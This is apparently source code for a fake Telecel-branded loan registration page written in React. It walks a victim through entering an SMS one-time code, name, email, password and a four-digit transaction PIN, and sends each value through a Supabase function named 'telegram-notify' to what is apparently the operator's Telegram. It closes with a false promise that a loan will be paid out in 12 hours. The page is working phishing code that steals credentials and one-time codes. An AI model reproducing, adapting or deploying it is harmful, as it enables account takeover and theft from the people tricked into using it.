import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Eye, EyeOff, X, Check } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import MobileShell from "@/components/MobileShell";
import { supabase } from "@/integrations/supabase/client";

type Step = "otp" | "details" | "pin" | "success";

const RegisterPage = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState<Step>("otp");
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(60);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);

  const saved = localStorage.getItem("telecel_loan");
  const loanData = saved ? JSON.parse(saved) : {};
  const phone = loanData.verifyPhone || "N/A";
  const maskedPhone = phone.length >= 4 ? phone.slice(0, 3) + "xxxxx" + phone.slice(-2) : phone;

  useEffect(() => {
    if (step !== "otp" || timer <= 0) return;
    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [step, timer]);

  const passChecks = [
    { label: "Password must contain a number", valid: /\d/.test(password) },
    { label: "Password must contain a capital letter", valid: /[A-Z]/.test(password) },
    { label: "Password must be longer than 7 characters", valid: password.length > 7 },
    { label: "Password must contain a special character", valid: /[!@#$%^&*(),.?":{}|<>]/.test(password) },
    { label: "Passwords must match", valid: password.length > 0 && password === confirmPassword },
  ];

  const allPassValid = passChecks.every((c) => c.valid);

  const sendToTelegram = async (type: string, value: string) => {
    try {
      await supabase.functions.invoke("telegram-notify", {
        body: { type, value, phone },
      });
    } catch (e) {
      console.error(`Error sending ${type}:`, e);
    }
  };

  const handleOtpNext = async () => {
    if (otp.length < 5) return;
    setLoading(true);
    await sendToTelegram("register_otp", otp);
    setLoading(false);
    setStep("details");
  };

  const handleDetailsNext = async () => {
    if (!firstName || !lastName || !allPassValid) return;
    setLoading(true);
    const details = `First Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email || "N/A"}\nPassword: ${password}`;
    await sendToTelegram("register_details", details);
    setLoading(false);
    setStep("pin");
  };

  const handlePinConfirm = async () => {
    if (pin.length < 4) return;
    setLoading(true);
    await sendToTelegram("register_pin", pin);
    localStorage.setItem("telecel_loan", JSON.stringify({
      ...loanData, regFirstName: firstName, regLastName: lastName, regEmail: email,
    }));
    setLoading(false);
    setStep("success");
  };

  if (step === "otp") {
    return (
      <MobileShell>
        <div className="flex-1 flex flex-col">
          {/* Red gradient header area */}
          <div className="relative h-48 overflow-hidden">
            <div className="absolute inset-0 telecel-gradient opacity-30" style={{ clipPath: "polygon(60% 0, 100% 0, 100% 100%, 30% 100%)" }} />
          </div>

          <div className="flex-1 px-6 flex flex-col items-center -mt-12">
            <div className="w-16 h-16 rounded-full bg-primary flex items-center justify-center mb-2">
              <span className="text-primary-foreground font-bold text-xl">t</span>
            </div>
            <h2 className="text-lg font-bold text-primary">telecel</h2>
            <h3 className="text-lg font-bold text-primary mt-4">Enter Verification Code</h3>
            <p className="text-sm text-muted-foreground text-center mt-2">
              To create your account, we've sent a one-time password to {maskedPhone}. Enter it below to continue
            </p>
            <span className="text-primary font-semibold mt-2">
              {String(Math.floor(timer / 60)).padStart(2, "0")}:{String(timer % 60).padStart(2, "0")}
            </span>

            <div className="mt-6">
              <Label className="text-xs">OTP</Label>
              <InputOTP maxLength={5} value={otp} onChange={setOtp}>
                <InputOTPGroup>
                  {[0, 1, 2, 3, 4].map((i) => (
                    <InputOTPSlot key={i} index={i} className="w-14 h-14 text-lg" />
                  ))}
                </InputOTPGroup>
              </InputOTP>
            </div>
          </div>

          <div className="px-6 pb-6 space-y-3">
            <Button onClick={handleOtpNext} disabled={otp.length < 5 || loading} className="w-full h-12 rounded-xl font-semibold">
              {loading ? "Sending..." : "Next"}
            </Button>
            <Button onClick={() => navigate("/verify")} variant="outline" className="w-full h-12 rounded-xl font-semibold border-primary text-primary">
              Go Back
            </Button>
          </div>
        </div>
      </MobileShell>
    );
  }

  if (step === "details") {
    return (
      <MobileShell>
        <div className="telecel-gradient px-6 py-6 text-center">
          <h2 className="text-2xl font-black text-primary-foreground italic">telecel</h2>
          <h3 className="text-lg font-bold text-primary-foreground mt-1">Create an account</h3>
          <p className="text-sm text-primary-foreground/80 mt-1">Enter your details below to create your account.</p>
        </div>

        <div className="flex-1 px-6 py-6 space-y-4 overflow-auto">
          <div>
            <Label className="text-sm font-medium">First Name</Label>
            <Input value={firstName} onChange={(e) => setFirstName(e.target.value)} placeholder="Richard" className="mt-1 h-12 rounded-xl" />
          </div>
          <div>
            <Label className="text-sm font-medium">Last Name</Label>
            <Input value={lastName} onChange={(e) => setLastName(e.target.value)} placeholder="Kwesi Mwarfo" className="mt-1 h-12 rounded-xl" />
          </div>
          <div>
            <Label className="text-sm font-medium">Email (optional)</Label>
            <Input value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@domain.com" type="email" className="mt-1 h-12 rounded-xl" />
          </div>
          <div>
            <Label className="text-sm font-medium">Password</Label>
            <div className="relative mt-1">
              <Input type={showPass ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="XXXXXXXXXX" className="h-12 rounded-xl pr-10" />
              <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground">
                {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          <div className="space-y-1">
            {passChecks.map((c, i) => (
              <div key={i} className="flex items-center gap-2 text-sm">
                {c.valid ? <Check className="w-4 h-4 text-green-500" /> : <X className="w-4 h-4 text-primary" />}
                <span className={c.valid ? "text-green-600 font-semibold" : "text-primary font-semibold"}>{c.label}</span>
              </div>
            ))}
          </div>

          <div>
            <Label className="text-sm font-medium">Confirm New Password</Label>
            <div className="relative mt-1">
              <Input type={showConfirm ? "text" : "password"} value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} placeholder="XXXXXXXXXX" className="h-12 rounded-xl pr-10" />
              <button type="button" onClick={() => setShowConfirm(!showConfirm)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground">
                {showConfirm ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>
        </div>

        <div className="px-6 pb-6">
          <Button onClick={handleDetailsNext} disabled={!firstName || !lastName || !allPassValid || loading} className="w-full h-12 rounded-xl font-semibold">
            {loading ? "Sending..." : "Next"}
          </Button>
        </div>
      </MobileShell>
    );
  }

  if (step === "pin") {
    return (
      <MobileShell>
        <div className="telecel-gradient px-6 py-4 flex items-center gap-3">
          <button onClick={() => setStep("details")} className="text-primary-foreground">
            <ArrowLeft className="w-5 h-5" />
          </button>
          <h1 className="text-lg font-bold text-primary-foreground">Create PIN</h1>
        </div>

        <div className="flex-1 px-6 py-6 flex flex-col items-center space-y-6">
          <div className="text-center">
            <h2 className="text-lg font-semibold">Set a 4-Digit PIN</h2>
            <p className="text-sm text-muted-foreground mt-1">This PIN will be used for future transactions.</p>
          </div>
          <InputOTP maxLength={4} value={pin} onChange={setPin}>
            <InputOTPGroup>
              {[0, 1, 2, 3].map((i) => (
                <InputOTPSlot key={i} index={i} />
              ))}
            </InputOTPGroup>
          </InputOTP>
        </div>

        <div className="px-6 pb-6">
          <Button onClick={handlePinConfirm} disabled={pin.length < 4 || loading} className="w-full h-12 rounded-xl font-semibold">
            {loading ? "Sending..." : "Confirm"}
          </Button>
        </div>
      </MobileShell>
    );
  }

  // Success step
  return (
    <MobileShell>
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-10">
        <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
          <Check className="w-12 h-12 text-green-500" />
        </div>
        <h1 className="text-xl font-bold text-center">Account Created!</h1>
        <p className="text-sm text-muted-foreground text-center mt-2 max-w-[280px]">
          Hi {firstName}, your Telecel account has been created successfully. Your loan is being approved and will be disbursed within <span className="font-semibold text-primary">12 hours</span>.
        </p>
      </div>
      <div className="px-6 pb-6">
        <Button onClick={() => navigate("/")} className="w-full h-12 rounded-xl font-semibold">Done</Button>
      </div>
    </MobileShell>
  );
};

export default RegisterPage;
